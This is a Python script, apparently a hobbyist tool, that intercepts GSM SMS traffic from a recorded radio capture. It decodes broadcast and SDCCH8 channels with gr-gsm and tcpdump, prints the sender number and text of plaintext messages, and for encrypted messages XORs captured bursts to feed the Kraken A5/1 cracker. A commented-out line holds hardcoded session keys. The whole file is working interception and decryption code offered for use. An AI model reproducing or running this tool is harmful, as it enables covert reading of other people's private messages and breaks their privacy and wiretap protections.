#!/usr/bin/python
import os
import argparse
import ConfigParser
import pyshark
import subprocess
from subprocess import check_output
import sys
#Author: B10sh0ck

#xor function
def xor(x, y):
	if len(x)>=114 and len(y)>=114:
        	r = ""
        	for i in range(114):
            		a = ord(x[i])
            		b = ord(y[i])
            		r = r+chr(48^a^b)
        	return r

def bursts(fnumber):
	bashCommand = "grep \"" + str(fnumber) + "\|" + str(fnumber + 1) + "\|" + str(fnumber + 2) + "\|" + str(fnumber + 3) + "\" " + arfcn + "_p4.rburst"
	bashCommand +=" >> " + arfcn + "_p4.gsmfn ;"
	#print os.system(command)
	try:
		out =  check_output(['bash', '-c', bashCommand])
	except subprocess.CalledProcessError as e:
    		out = e.output
	#print out

def kraken_feeder():
	with open(arfcn + "_p4.gsmfn") as f:
		content = f.readlines()
		f.close()
	i = 0
	while (i < len(content)/2):
		temp = i + 16
		#print i
		print ("\n" + content[temp + 0].split()[1] + " " + str(xor(content[i + 0].split()[2], content[temp + 0].split()[2])))
		print ("\n" + content[temp + 1].split()[1] + " " + str(xor(content[i + 1].split()[2], content[temp + 1].split()[2])))
		print ("\n" + content[temp + 2].split()[1] + " " + str(xor(content[i + 2].split()[2], content[temp + 2].split()[2])))
		print ("\n" + content[temp + 3].split()[1] + " " + str(xor(content[i + 3].split()[2], content[temp + 3].split()[2])))
		print ("\n")
		i += 4
	#with open("newfile.txt","wb") as output:

#def kraken_sender():
#Parse from command line
parser = argparse.ArgumentParser(description='GSM DECODING...')
parser.add_argument('ARFCN', metavar='a', type=int, help='Arfcn | Filename without extension.')
parser.add_argument('DEV', metavar='d', type=int, help='Device index.')
args = parser.parse_args()
arfcn = str(args.ARFCN)
dev = str(args.DEV)

#Parse from config file
config = ConfigParser.ConfigParser()
config.read("config")
PPM = config.getint("settings" + dev,"PPM")
SAMP_RATE = config.get("settings" + dev,"SAMP_RATE")
ppm = str(PPM)
samp_rate = str(SAMP_RATE)

#Check whether cfile exist
if (os.path.isfile(arfcn + ".cfile") != True):
	print (arfcn + ".cfile doesn't exist.")
	sys.exit(0)

#Display Filter for tshark
dfilter = "\"gsm_a.dtap.msg_rr_type == 0x3f && gsm_a.rr.sdcch8_sdcchc8_cbch != 0\""
dfilter2 = "\"gsm_sms\""
dfilter3 = "\"gsm_a.dtap.msg_rr_type == 0x35\""

#Phase #1: DECODING BCCH CHANNEL INTO .PCAP AND FILTER INTO _P1.PCAP
#If there is already _p0.pcap file or _p1.pcap, this phase will be skipped
print ("\033[1;36;40m++++++Phase 1++++++")
if (os.path.isfile(arfcn + "_p1.pcap") != True):
	phase1 = "tcpdump -f udp -i lo -w " + arfcn + "_p1.pcap > /dev/null 2>&1 & sleep 1 ; grgsm_decode --ppm=" + ppm + " -s " + samp_rate + " -a " + arfcn + " -c " + arfcn + ".cfile -m BCCH -t 0 ;  kill $(ps -e | grep tcpdump | awk '{print $1}')"
	print (phase1)
	print (os.system(phase1))

#Phase #2: GET TIMESLOT VALUE FROM _P1.PCAP AND FEED TO THE "DECODING SDCCH8 CHANNEL INTO _P2.PCAP" PROCESS
#Similarly, if there is _p2.pcap file, this phase will be skipped
print ("\n\033[1;36;40m++++++Phase 2++++++")

if (os.path.isfile(arfcn + "_p2.pcap") != True):
	if (os.path.isfile(arfcn + "_p4.rburst") != False):
		print (os.system("rm " + arfcn + "_p4.rburst"))
	cap1 = pyshark.FileCapture(arfcn + "_p1.pcap")
	bashCommand = "tshark -Y " + dfilter + " -r " + arfcn + "_p1.pcap"
	try:
		out =  check_output(['bash', '-c', bashCommand])
	except subprocess.CalledProcessError as e:
    		out = e.output
	#print out
	#temp = subprocess.Popen(['bash', '-c', 'tshark -Y ' + dfilter + ' -r ' + arfcn + '_p1.pcap'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	#out, err = temp.communicate()
	if (out != ""):
		dic = out.split()
		temp = int(dic[0]) - 1
		timeslot = cap1[temp]['gsm_a.ccch'].gsm_a_rr_timeslot
		hopping_channel = cap1[temp]['gsm_a.ccch'].gsm_a_rr_hopping_channel
		print ("Timeslot = " + timeslot)
		print (hopping_channel)
		if (hopping_channel != '0'):
			print ("\033[1;37;40m------------------------RESULT------------------------")
			print ("Hopping channel is used.")
			sys.exit(0)
		#phase2 = "tcpdump -i lo -w " + arfcn + "_p2.pcap > /dev/null 2>&1 & sleep 1 ; grgsm_decode --ppm=" + ppm + " -s " + samp_rate + " -a " + arfcn + " -c " + arfcn + ".cfile -m SDCCH8 -t " + timeslot + " -p >> " + arfcn + "_p4.rburst -k \"9f6eb5e284c29869\";  kill $(ps -e | grep tcpdump | awk '{print $1}')" #-e 1 -k \"788ebc67eb174125\"" #\"a04f7f349d1722ae\"" #-k \"cf5ae58298c19a86\""
		phase2 = "tcpdump -i lo -w " + arfcn + "_p2.pcap > /dev/null 2>&1 & sleep 0.5 ; grgsm_decode --ppm=" + ppm + " -s " + samp_rate + " -a " + arfcn + " -c " + arfcn + ".cfile -m SDCCH8 -t " + timeslot + " -p >> " + arfcn + "_p4.rburst ;  kill $(ps -e | grep tcpdump | awk '{print $1}')" 
		print (phase2)
		print (os.system(phase2))
	else:
		print ("\033[1;37;40m------------------------RESULT------------------------")
		print ("There isn't any sms message captured.")
		sys.exit(0)

#Phase #3: IF POSSIBLE, GET SMS CONTENT AND SENDER'S NUMBER FROM _P2.PCAP, THEN PRINT THEM
print ("\n\033[1;36;40m++++++Phase 3++++++")
cap2 = pyshark.FileCapture(arfcn + "_p2.pcap")
bashCommand = "tshark -Y " + dfilter2 + " -r " + arfcn + "_p2.pcap"
try:
	out2 =  check_output(['bash', '-c', bashCommand])
except subprocess.CalledProcessError as e:
	out2 = e.output
#print out
#temp = subprocess.Popen(['bash', '-c', 'tshark -Y ' + dfilter2 + ' -r ' + arfcn + '_p2.pcap'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
#out, err = temp.communicate()

if (out2 != ""):
	print ("\n\033[1;31;40m------------------------RESULT------------------------")
	dic = out2.split()
	if (os.path.isfile(arfcn + "_p3.result") != True):
		while True:
			if (dic != []):
				temp = int(dic[0]) - 1
				dic[0:18] = []
			else:
				break
			rs = "[" + str(temp+1) + "]\nFrom: " + cap2[temp]['gsm_sms'].tp_oa + "\nContent: " + cap2[temp]['gsm_sms'].sms_text + "\n"
			with open(arfcn + "_p3.result", "a") as result:
				result.write(rs)
		phase3 = "cat " + arfcn + "_p3.result"
		print (os.system(phase3))
		sys.exit(0)

#Phase #4: IF THE SMS MESSAGE WAS ENCRYPTED, CRACK IT USING KRAKEN

#temp = subprocess.Popen(['bash', '-c', 'tshark -Y ' + dfilter3 + ' -r ' + arfcn + '_p2.pcap'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
#out, err = temp.communicate()

bashCommand = "tshark -Y " + dfilter3 + " -r " + arfcn + "_p2.pcap"
try:
	out3 =  check_output(['bash', '-c', bashCommand])
except subprocess.CalledProcessError as e:
	out3 = e.output
#print out
if (os.path.isfile(arfcn + "_p4.gsmfn") != False):
	print (os.system("rm " + arfcn + "_p4.gsmfn"))
#print out
#print dic[0]
if (out3 != ""):
	dic = out3.split()
	print ("\n\033[1;37;40mThe sms message was encrypted.\n\n\033[1;36;40m++++++Phase 4++++++")
	temp2 = None
	while True:
		#print dic[0]
		if (dic != []):
			#print "\n[" + dic[0] + "] Ciphering Mode Command"
			dfilter4 = "\"gsm_a.dtap.msg_rr_type == 0x1d || gsm_a.dtap.msg_rr_type == 0x05 && frame.number < \"" + dic[0]
			#dfilter4 = "\"gsmtap.chan_type == 136 && frame.number < \"" + dic[0]
			dic[0:14] = []
			#temp = subprocess.Popen(['bash', '-c', 'tshark -Y ' + dfilter4 + ' -r ' + arfcn + '_p2.pcap'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			#out, err = temp.communicate()
			bashCommand = "tshark -Y " + dfilter4 + " -r " + arfcn + "_p2.pcap"
			try:
				out4 =  check_output(['bash', '-c', bashCommand])
			except subprocess.CalledProcessError as e:
				out4 = e.output
			#print out
			dic2 = out4.split()
			#print out
			#Number of SI5 packets
			n = len(dic2)/14
			i = 0
			#print dic2
			while (i < n - 1):
				dic2[0:14] = []
				i += 1
			if (dic2[0] != temp2):
				#bursts()
				fnumber = int(cap2[int(dic2[0])-1]['gsmtap'].frame_nr)
				print ("[" + dic2[0] + "]")
				#print "[0] GSM Frame Number: " + fnumber
				temp2 = dic2[0]
				#fnumber = int(fnumber) - 102
				#fnumber -= 306
				fnumber -= 204
				#fnumber -= 102
				y = 0
				while (y < 8):
					print (fnumber)
					bursts(fnumber)
					fnumber += 102
					y += 1
				kraken_feeder()
				print (os.system("rm " + arfcn + "_p4.gsmfn"))
			else:
				continue
				#print "[" + dic2[0] + "] Duplicate."
			#dic2[1:14] = []
			#break;
		else:
			break;
else:
	print ("\033[1;37;40m------------------------RESULT------------------------")
	print ("There isn't any sms message captured.")
